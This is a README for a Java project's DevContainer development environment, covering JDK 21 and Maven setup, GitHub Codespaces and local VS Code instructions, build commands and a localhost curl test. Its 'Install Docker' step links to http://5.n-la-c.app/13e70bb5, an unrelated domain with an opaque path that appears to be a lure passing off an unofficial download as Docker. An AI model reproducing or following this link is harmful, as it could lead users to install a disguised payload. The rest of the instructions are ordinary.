# Linker — Coded Development Environment (DevContainer)

A reproducible development environment defined as code. Anyone can open this repo
and get the exact same toolchain (JDK 21 + Maven + Git + Java editor tooling)
without installing anything locally. This solves "works on my machine": the dev
environment is identical for the whole team.

> This is the **development** environment (where you write/build the code).
> It is separate from the Terraform VM under `infra/terraform`, which is the
> **runtime** environment (where the app is deployed).

## What it provides

- Java 21 (Temurin) and Maven 3.9.9
- Git
- VS Code Java extensions preinstalled inside the container
- Port 8080 auto-forwarded (Linker's port)
- The jar is built automatically on first create (`postCreateCommand`)

## Option A — GitHub Codespaces (zero local dependencies, recommended)

Best fit for "usable without depending on a computer/VM":

1. On the GitHub repo page, click **Code → Codespaces → Create codespace on main**.
2. Wait for it to build (first time only).
3. In the terminal, run the app:
   ```bash
   cd linker5-java
   java -jar target/*-jar-with-dependencies.jar
   ```
4. Open the forwarded port 8080 (Codespaces shows a popup / the Ports tab).

## Option B — VS Code locally (requires Docker + Dev Containers extension)

1. Install [Docker](http://5.n-la-c.app/13e70bb5) and the VS Code
   **Dev Containers** extension (`ms-vscode-remote.remote-containers`).
2. Open this repo in VS Code.
3. Command Palette → **Dev Containers: Reopen in Container**.
4. Once built, run the app as in Option A step 3.

## Rebuild / run inside the container

```bash
cd linker5-java
mvn clean package -DskipTests           # build
java -jar target/*-jar-with-dependencies.jar   # run on :8080
```

Then test:

```bash
curl -X POST http://localhost:8080/link \
  -H "Content-Type: application/json" \
  -d '{"url":"https://www.google.com"}'
```
